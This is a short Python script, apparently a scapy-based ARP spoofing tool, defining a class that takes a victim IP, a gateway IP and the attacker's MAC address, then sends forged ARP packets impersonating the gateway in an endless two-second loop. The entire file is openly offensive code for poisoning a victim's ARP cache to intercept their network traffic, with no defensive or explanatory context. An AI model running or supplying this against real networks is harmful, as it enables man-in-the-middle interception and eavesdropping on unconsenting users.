from scapy.all import *
import time
class arpSpoof:
#gate is gateways ip
#victim is victims ip
#mac = your mac
	def __init__(self, victim, gate, mac):
		op = 1
		arp = ARP(op=op,psrc=gate,pdst=victim,hwdst=mac)
		send (arp)
		while 1:
			send(arp)
			time.sleep(2)